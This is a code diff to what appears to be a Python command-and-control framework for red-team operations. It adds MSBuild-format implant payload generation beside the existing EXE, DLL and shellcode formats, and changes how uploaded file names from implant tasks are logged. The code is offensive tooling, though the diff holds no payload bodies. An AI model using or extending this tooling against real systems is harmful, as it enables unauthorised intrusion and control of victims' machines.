@@ -214,9 +214,12 @@ def startup(printhelp = ""):
         if i[3] not in hosts:
           hosts += "%s \n" % i[3]
       for t in comtasks:
-        if "Upload-File" in t[3]:
-          hostname = get_implantdetails(t[2])
-          uploads += "%s %s \n" % (hostname[3], t[3])   
+        hostname = get_implantdetails(t[2])
+        if "Upload-File" in t[3]:          
+          uploadedfile = t[3]
+          uploadedfile = uploadedfile.partition("estination ")[2]
+          uploadedfile = uploadedfile.partition(" -Base64")[0]
+          uploads += "%s %s \n" % (hostname[3], uploadedfile)   
         if "Installing" in t[4]:
           hostname = get_implantdetails(t[2])
           line = t[4].replace('\n','')
@@ -275,7 +278,8 @@ def startup(printhelp = ""):
       newPayload.CreateRaw(name)
       newPayload.CreateDlls(name)
       newPayload.CreateShellcode(name) 
-      newPayload.CreateEXE(name)     
+      newPayload.CreateEXE(name) 
+      newPayload.CreateMsbuild(name)
       startup("Created new %s daisy payloads" % name)
 
     if "createproxypayload" in implant_id.lower():
@@ -293,7 +297,8 @@ def startup(printhelp = ""):
       newPayload.CreateRaw("Proxy")
       newPayload.CreateDlls("Proxy")
       newPayload.CreateShellcode("Proxy")
-      newPayload.CreateEXE("Proxy")   
+      newPayload.CreateEXE("Proxy")
+      newPayload.CreateMsbuild("Proxy")
       startup("Created new proxy payloads")
 
     if "createnewpayload" in implant_id.lower():
@@ -306,6 +311,7 @@ def startup(printhelp = ""):
       proxyurl = raw_input("Proxy URL: .e.g. http://10.150.10.1:8080 ")
       if proxyurl:
         imurl = "%s?p" % get_newimplanturl()
+        domainbase = "Proxy%s" % domainbase
       else:
         imurl = get_newimplanturl()
       C2 = get_c2server_all()
@@ -317,6 +323,7 @@ def startup(printhelp = ""):
       newPayload.CreateDlls("%s_" % domainbase)
       newPayload.CreateShellcode("%s_" % domainbase)
       newPayload.CreateEXE("%s_" % domainbase)
+      newPayload.CreateMsbuild("%s_" % domainbase)
       startup("Created new payloads")
 
     if (implant_id == "?") or (implant_id == "help"):
@@ -869,6 +876,7 @@ def runcommand(command, randomuri):
       newPayload.CreateDlls(name)
       newPayload.CreateShellcode(name)    
       newPayload.CreateEXE(name)   
+      newPayload.CreateMsbuild(name)
       startup("Created new %s daisy payloads" % name)
 
     elif "createproxypayload" in command.lower():
@@ -886,7 +894,8 @@ def runcommand(command, randomuri):
       newPayload.CreateRaw("Proxy")
       newPayload.CreateDlls("Proxy")
       newPayload.CreateShellcode("Proxy")
-      newPayload.CreateEXE("Proxy")      
+      newPayload.CreateEXE("Proxy")
+      newPayload.CreateMsbuild("Proxy")
       startup("Created new proxy payloads")
 
     elif "createnewpayload" in command.lower():
@@ -899,6 +908,7 @@ def runcommand(command, randomuri):
       proxyurl = raw_input("Proxy URL: .e.g. http://10.150.10.1:8080 ")
       if proxyurl:
         imurl = "%s?p" % get_newimplanturl()
+        domainbase = "Proxy%s" % domainbase
       else:
         imurl = get_newimplanturl()
       C2 = get_c2server_all()
@@ -910,6 +920,7 @@ def runcommand(command, randomuri):
       newPayload.CreateDlls("%s_" % domainbase)
       newPayload.CreateShellcode("%s_" % domainbase)
       newPayload.CreateEXE("%s_" % domainbase)
+      newPayload.CreateMsbuild("%s_" % domainbase)
       startup("Created new payloads")
     else:
       if command:
